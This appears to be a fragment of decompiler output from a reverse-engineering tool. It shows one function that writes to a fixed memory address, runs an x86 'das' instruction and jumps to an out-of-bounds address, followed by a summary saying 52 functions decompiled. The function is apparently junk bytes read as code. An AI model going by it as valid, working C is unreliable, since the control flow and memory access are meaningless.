//----- (00410884) --------------------------------------------------------
void __usercall __noreturn sub_410884(char a1@<al>, int a2@<ebx>)
{
  MEMORY[0x2D9C5ED5] = a2;
  _AL = a1 ^ 0xB8;
  __asm { das }
  JUMPOUT(0x1CAA7A5F);
}
// 410893: control flows out of bounds to 1CAA7A5F

// nfuncs=52 queued=52 decompiled=52 lumina nreq=0 worse=0 better=0
// ALL OK, 52 function(s) have been successfully decompiled
